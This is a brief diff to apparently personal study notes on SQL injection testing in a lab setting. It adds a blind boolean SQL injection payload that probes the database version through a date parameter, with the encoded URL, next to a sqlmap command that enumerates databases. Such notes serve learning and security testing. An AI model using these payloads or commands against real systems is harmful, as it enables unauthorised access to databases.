@@ -11,7 +11,12 @@ This approach ensures a thorough assessment before leveraging automated tools fo
 
 
 Eg --->
-==Using SQL map== for the identified vulnerable Query parameter :-
+==Using SQL map== 
+for the identified vulnerable Query parameter 
+(http://sqli2.naham.sec:8081/article-count?date=may%202020%27%20and%20substring(@@version,1,1%20)%3E=5%20and%20%271=1) 
+(i.e payload used to find vulnerablity :-   ==may 2020' and substring(@@version,1,1 )>=5 and '1=1==):-
+
+
 -  sqlmap -u http://sqli2.naham.sec:8081/article-count?date=may%202020 --dbs --batch
 
 ```
